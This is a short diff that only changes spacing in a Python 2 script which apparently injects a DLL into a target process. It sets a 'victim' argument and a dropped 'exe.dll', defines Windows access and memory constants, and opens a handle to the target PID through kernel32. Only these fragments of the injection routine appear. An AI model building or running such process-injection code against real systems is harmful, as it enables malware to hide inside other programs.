@@ -19,8 +19,8 @@ victim = sys.argv[3]
 dropname = "exe.dll"
 
 PAGE_READWRITE = 0x04
-PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
-VIRTUAL_MEM = ( 0x1000 | 0x2000 )
+PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF)
+VIRTUAL_MEM = (0x1000 | 0x2000)
 
 kernel32 = windll.kernel32
 
@@ -47,7 +47,7 @@ dll_path = hax
 dll_len = len(dll_path)
 
 # Get handle to process being injected...
-h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )
+h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
 
 if not h_process:
     print "[!] Couldn't get handle to PID: %s" %(pid)
